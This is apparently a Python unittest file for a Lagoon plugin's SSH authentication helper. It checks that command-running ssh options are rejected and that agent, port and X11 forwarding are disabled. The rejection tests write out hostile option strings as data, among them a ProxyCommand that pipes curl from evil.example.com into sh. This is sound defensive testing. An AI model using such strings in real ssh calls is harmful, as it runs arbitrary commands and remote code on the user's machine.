import unittest

from .....plugins.module_utils.auth import (
    LagoonAuthError,
    LagoonCredentials,
    normalise_ssh_options,
)
from .test_auth_resolution import AuthTestCase


class SshOptionRejectionTester(unittest.TestCase):
    """ssh_options is split into ssh's argv, so an option that makes ssh run a
    command is arbitrary command execution.

    Playbook-author controlled rather than end-user controlled, so this is
    defence in depth - but the check is one line.
    """

    def test_proxycommand_is_rejected_in_every_form(self):
        for option in [
            "-o ProxyCommand=/bin/sh",
            "-oProxyCommand=/bin/sh",
            "ProxyCommand=/bin/sh",
            "-o proxycommand=curl evil.example.com|sh",
            "-o PROXYCOMMAND=x",
            "-o Proxy Command=x",
        ]:
            with self.assertRaises(LagoonAuthError, msg=f"accepted {option!r}"):
                normalise_ssh_options(option)

    def test_localcommand_and_permitlocalcommand_are_rejected(self):
        for option in [
            "-o LocalCommand=/bin/sh",
            "-o PermitLocalCommand=yes",
            "-oPermitLocalCommand=yes",
        ]:
            with self.assertRaises(LagoonAuthError, msg=f"accepted {option!r}"):
                normalise_ssh_options(option)

    def test_rejected_inside_a_longer_option_string(self):
        with self.assertRaises(LagoonAuthError):
            normalise_ssh_options("-q -o ConnectTimeout=5 -o ProxyCommand=/bin/sh")

    def test_rejected_in_list_form(self):
        with self.assertRaises(LagoonAuthError):
            normalise_ssh_options(["-q", "-o", "ProxyCommand=/bin/sh"])

    def test_the_constructor_rejects_them_too(self):
        with self.assertRaises(LagoonAuthError):
            LagoonCredentials(ssh_options="-o ProxyCommand=/bin/sh")


class SshOptionNormalisationTester(unittest.TestCase):
    def test_none_and_empty_become_no_options(self):
        for value in [None, "", [], ()]:
            assert normalise_ssh_options(value) == []

    def test_a_list_is_taken_as_argv(self):
        assert normalise_ssh_options(["-q", "-o", "ConnectTimeout=5"]) == [
            "-q",
            "-o",
            "ConnectTimeout=5",
        ]

    def test_a_string_is_split_for_backwards_compatibility(self):
        assert normalise_ssh_options("-q -o ConnectTimeout=5") == [
            "-q",
            "-o",
            "ConnectTimeout=5",
        ]

    def test_ordinary_options_pass_through(self):
        for option in [
            "-q",
            "-o ConnectTimeout=5",
            "-o StrictHostKeyChecking=no",
            "-o UserKnownHostsFile=/dev/null",
            "-o BatchMode=yes",
        ]:
            assert normalise_ssh_options(option)


class SshOptionPassThroughTester(AuthTestCase):
    def test_supplied_options_reach_the_command(self):
        self.credentials(ssh_options=["-q", "-o", "ConnectTimeout=5"]).token()

        argv = self.argv()
        assert "-q" in argv
        assert "ConnectTimeout=5" in argv

    def test_a_caller_can_still_opt_into_the_old_host_key_behaviour(self):
        """Not a default any more, but available to anyone who needs it."""

        self.credentials(
            ssh_options="-o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no"
        ).token()

        assert "StrictHostKeyChecking=no" in self.argv()


if __name__ == "__main__":
    unittest.main()


class ForwardingHardeningTester(AuthTestCase):
    """A passwordless ssh login must not forward the agent, ports or X11.

    Fetching a grant needs none of them, and the default of passing no
    ssh_options means the machine's own config would otherwise decide - so a
    CI image with `Host * / ForwardAgent yes` would hand its agent to the
    Lagoon SSH endpoint on every token mint.
    """

    HARDENED = [
        "ForwardAgent=no",
        "ClearAllForwardings=yes",
        "ForwardX11=no",
        "RequestTTY=no",
    ]

    def assert_hardened(self, argv):
        for option in self.HARDENED:
            assert option in argv, f"{option} missing from {argv}"

    def test_hardened_with_an_explicit_token(self):
        """Precedence 1 runs no ssh at all, so there is nothing to harden."""

        self.credentials(token="supplied-token").token()
        self.ssh.assert_not_called()

    def test_hardened_with_key_content(self):
        self.credentials(ssh_private_key="key-content").token()
        self.assert_hardened(self.argv())

    def test_hardened_with_a_key_file(self):
        self.credentials(ssh_private_key_file="/keys/id_rsa").token()
        self.assert_hardened(self.argv())

    def test_hardened_with_nothing_supplied(self):
        """The new default path, and the one that inherits the user's own
        ssh configuration."""

        self.credentials().token()
        self.assert_hardened(self.argv())

    def test_hardening_precedes_caller_options_so_it_cannot_be_relaxed(self):
        """ssh takes the first value it is given for these keywords, so the
        hardening has to come first in argv."""

        self.credentials(ssh_options=["-o", "ForwardAgent=yes"]).token()

        argv = self.argv()
        assert argv.index("ForwardAgent=no") < argv.index("ForwardAgent=yes")

    def test_host_key_checking_is_still_left_to_the_user(self):
        """The hardening must not drag the host key options back in - those
        were deliberately handed to the machine's own configuration."""

        self.credentials().token()

        joined = " ".join(self.argv())
        assert "StrictHostKeyChecking" not in joined
        assert "UserKnownHostsFile" not in joined

    def test_identities_only_when_a_key_is_supplied(self):
        """So a supplied key is the key actually used, rather than whatever
        the agent offers first."""

        for kwargs in [
            {"ssh_private_key": "key-content"},
            {"ssh_private_key_file": "/keys/id_rsa"},
        ]:
            self.ssh.reset_mock()
            credentials = self.credentials(**kwargs)
            credentials.token()
            assert "IdentitiesOnly=yes" in self.argv(), kwargs
            credentials.invalidate()

    def test_no_identities_only_when_relying_on_the_agent(self):
        self.credentials().token()
        assert "IdentitiesOnly=yes" not in self.argv()
